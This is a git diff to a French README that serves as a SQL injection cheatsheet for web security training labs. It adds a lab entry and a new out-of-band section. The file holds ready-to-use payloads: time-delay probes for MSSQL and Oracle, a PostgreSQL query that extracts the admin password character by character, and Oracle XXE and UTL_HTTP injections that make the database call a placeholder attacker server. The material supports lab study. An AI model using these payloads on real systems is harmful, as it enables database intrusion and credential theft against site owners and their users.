@@ -19,6 +19,7 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 - [x] 🟠 **Praticien** : [Blind SQL injection with conditional errors](./10-blind-sqli-errors.md)
 - [x] 🟠 **Praticien** : [Visible error-based SQL injection](./11-visible-error-sqli.md)
 - [x] 🔴 **Praticien** : [Blind SQL injection with time delays](./12-blind-sqli-time.md)
+- [x] 🔴 **Expert** : [Blind SQL injection with out-of-band interaction](./13-blind-sqli-oast.md)
 ---
 
 ## ⚔️ L'Arsenal Tactique (Cheatsheet)
@@ -78,6 +79,15 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
     * *MSSQL :* `'; WAITFOR DELAY '0:0:10'--`
     * *Oracle :* `'||dbms_pipe.receive_message('a',10)--`
 * **Exfiltration (Ex: PostgreSQL) :** `'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='admin')--`
-    * *Méthode :* Optimiser l'extraction manuellement avec une recherche dichotomique (utiliser `<` et `>`) pour trouver les caractères plus rapidement que le brute-force automatique.          
+    * *Méthode :* Optimiser l'extraction manuellement avec une recherche dichotomique (utiliser `<` et `>`) pour trouver les caractères plus rapidement que le brute-force automatique.     
+
+**
+```markdown
+### 8. Injections SQL Out-Of-Band (OAST)
+*Forcer la base de données à "téléphoner maison" (requête DNS/HTTP) lorsque les requêtes sont asynchrones (ni erreur, ni délai, ni affichage).*
+
+* **Oracle (via XXE dans EXTRACTVALUE) :** `'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://VOTRE_SERVEUR.com/"> %remote;]>'),'/l') FROM dual)--`
+* **Oracle (via UTL_HTTP) :** `'||(SELECT UTL_HTTP.REQUEST('http://VOTRE_SERVEUR.com') FROM dual)--`
+    * *Méthode :* Injecter le payload ciblant une adresse sous votre contrôle (ex: Burp Collaborator, interactsh, oastify). **Attention :** Ne cibler que la valeur d'injection pour l'encodage URL, jamais le cookie de session entier !         
 
 
